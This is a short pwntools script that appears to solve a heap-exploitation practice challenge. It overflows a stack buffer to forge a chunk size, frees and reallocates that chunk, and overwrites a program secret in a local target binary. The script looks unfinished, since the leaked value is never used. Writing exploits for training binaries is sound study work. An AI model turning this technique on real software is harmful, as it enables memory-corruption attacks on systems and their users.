#!/bin/python

from pwn import *
import sys

#context.log_level='debug'

STACK_OFFSET = 0x38
SECRET_OFFSET = 0x88 + 3

def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


if len(sys.argv) == 2:
    proc = process(sys.argv[1])
else:
    proc = gdb.debug(sys.argv[1], gdbscript='''
                        pwndbg-init
                        b main
                        c  
                        nextret
                     ''')

size = 16 * 11
proc.sendline(b'stack_scanf')
proc.sendline(cyclic(STACK_OFFSET)+p64(size))
proc.sendline(b'stack_free')

malloc(0, size - 16)
free(0)

# 'Y' * 16 is now the secret
# because it cannot be leaked for some reason...
scanf(0, b'X' * SECRET_OFFSET + b'Y' * 0x16)

ret_bytes = puts(0)

proc.interactive()
